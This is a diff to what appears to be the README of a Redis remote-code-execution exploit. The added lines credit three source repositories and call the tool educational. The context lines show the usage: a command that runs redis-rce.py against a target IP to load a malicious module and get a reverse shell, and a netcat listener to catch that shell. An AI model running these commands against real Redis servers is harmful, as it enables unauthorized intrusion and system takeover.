@@ -22,3 +22,10 @@ python3 redis-rce.py -r 192.168.121.69 -L 192.168.45.221 -P 8888 -f ./module.so
 ```bash
 nc -nvlp 8888
 ```
+-------
+- This Exploit is an aggregation of below exploits made for understanding and educational purposes.
+- Credits:
+  - https://github.com/RedisLabsModules/RedisModulesSDK
+  - https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
+  - https://github.com/Ridter/redis-rce
+  
